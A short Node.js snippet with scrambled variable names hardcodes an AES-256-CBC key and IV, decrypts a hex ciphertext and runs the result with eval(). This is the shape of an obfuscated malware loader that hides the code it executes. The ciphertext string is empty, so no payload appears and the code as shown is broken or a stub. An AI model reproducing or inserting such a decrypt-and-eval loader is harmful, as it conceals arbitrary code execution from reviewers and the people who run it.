const ito = require('crypto');
const itinho = Buffer.from('ac6f2ab6de241642de0b1d6e27d08fe3069fea6fa4f3500b26e917f2bb84fc38', 'hex');
const octua = Buffer.from('a4cf9725775963a7a864d4a77eedb365', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
